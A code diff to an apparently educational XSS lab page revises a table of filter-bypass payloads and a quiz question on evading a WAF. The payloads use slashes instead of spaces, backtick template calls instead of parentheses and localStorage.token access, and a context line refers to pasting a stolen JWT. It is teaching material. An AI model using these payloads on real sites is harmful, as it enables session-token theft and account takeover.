@@ -544,18 +544,18 @@ document.cookie = 'token=PASTE_STOLEN_JWT_HERE';</code></pre></div></div>
               <tbody>
                 <tr>
                   <td><strong>No Spaces (<code> </code>)</strong><br /><span style="font-size:var(--font-size-xs);color:var(--color-text-muted);">Strips or blocks whitespace</span></td>
-                  <td>The HTML5 tokenizer treats a forward slash (<code>/</code>) between a tag name and attributes as valid whitespace.</td>
-                  <td><code>&lt;img/src=x/onerror=alert(document.domain)&gt;</code></td>
+                  <td>The HTML5 tokenizer treats <code>/</code> after a tag name or after a quoted attribute (<code>"x"/</code>) as whitespace. <em>(Why quote <code>"x"</code>? Without quotes, the browser thinks <code>/onerror</code> is a folder path inside <code>src=x/onerror</code>!)</em></td>
+                  <td><code>&lt;img/src="x"/onerror=alert(document.domain)&gt;</code></td>
                 </tr>
                 <tr>
                   <td><strong>No Parentheses (<code>( )</code>)</strong><br /><span style="font-size:var(--font-size-xs);color:var(--color-text-muted);">Blocks function calls like <code>alert(1)</code></span></td>
                   <td>ES6 <strong>Tagged Template Literals</strong> let you invoke any JavaScript function using backticks (<code>`…`</code>) instead of parentheses!</td>
-                  <td><code>&lt;img/src=x/onerror=alert`1`&gt;</code></td>
+                  <td><code>&lt;img/src="x"/onerror=alert`1`&gt;</code><br /><span style="font-size:var(--font-size-xs);color:var(--color-text-muted);">or <code>&lt;details/open/ontoggle=alert`1`&gt;</code></span></td>
                 </tr>
                 <tr>
                   <td><strong>No Quotes (<code>' "</code>)</strong><br /><span style="font-size:var(--font-size-xs);color:var(--color-text-muted);">Breaks <code>getItem('token')</code></span></td>
-                  <td><code>localStorage</code> is a JS object, so dot notation (<code>localStorage.token</code>) reads the JWT with zero quotes and zero spaces.</td>
-                  <td><code>&lt;img/src=x/onerror=alert(localStorage.token)&gt;</code></td>
+                  <td><code>localStorage</code> is a JS object, so dot notation (<code>localStorage.token</code>) reads the JWT with zero quotes. Pair with boolean <code>open</code> on <code>&lt;details&gt;</code> to need zero spaces too!</td>
+                  <td><code>&lt;img src=x onerror=alert(localStorage.token)&gt;</code><br /><span style="font-size:var(--font-size-xs);color:var(--color-text-muted);">or <code>&lt;details/open/ontoggle=alert(localStorage.token)&gt;</code></span></td>
                 </tr>
               </tbody>
             </table>
@@ -767,11 +767,11 @@ this.searchValue = query;
 
         <div class="quiz-card" data-question-id="lab04-q7"
           data-expected-regex="^(?!.*[ ()])(?!.*&lt;\s*script)&lt;(img|svg|body|image|input|details|video|audio)/[^&gt;]*on\w+=alert`[^`]+`"
-          data-solution-rationale="Clean WAF bypass! Using / instead of spaces (&lt;img/src=x/onerror=...) and ES6 template backticks instead of parentheses (alert`1`) executes JavaScript with zero spaces and zero parentheses."
-          data-hint="Replace spaces inside the tag with a forward slash (/) and replace parentheses with ES6 backticks (`1`), e.g. &lt;img/src=x/onerror=alert`1`&gt;.">
+          data-solution-rationale="Clean WAF bypass! Using / instead of spaces (&lt;img/src=&quot;x&quot;/onerror=... or &lt;details/open/ontoggle=...) and ES6 template backticks instead of parentheses (alert`1`) executes JavaScript with zero spaces and zero parentheses."
+          data-hint="Replace spaces inside the tag with a forward slash (/) and replace parentheses with ES6 backticks (`1`), e.g. &lt;img/src=&quot;x&quot;/onerror=alert`1`&gt; or &lt;details/open/ontoggle=alert`1`&gt;.">
           <div class="quiz-question">Q7 [WAF-Bypass Challenge]: Write an XSS payload that pops <code>alert</code> with <code>1</code> <strong>without using <code>&lt;script&gt;</code>, spaces (<code> </code>), or parentheses (<code>( )</code>)</strong>.</div>
           <div class="quiz-input-group">
-            <input type="text" class="quiz-input" placeholder="&lt;img/src=x/onerror=...&gt;" spellcheck="false" autocomplete="off" />
+            <input type="text" class="quiz-input" placeholder="&lt;img/src=&quot;x&quot;/onerror=...&gt;" spellcheck="false" autocomplete="off" />
             <button type="button" class="quiz-submit-btn">Execute</button>
           </div>
           <div class="quiz-feedback"></div>
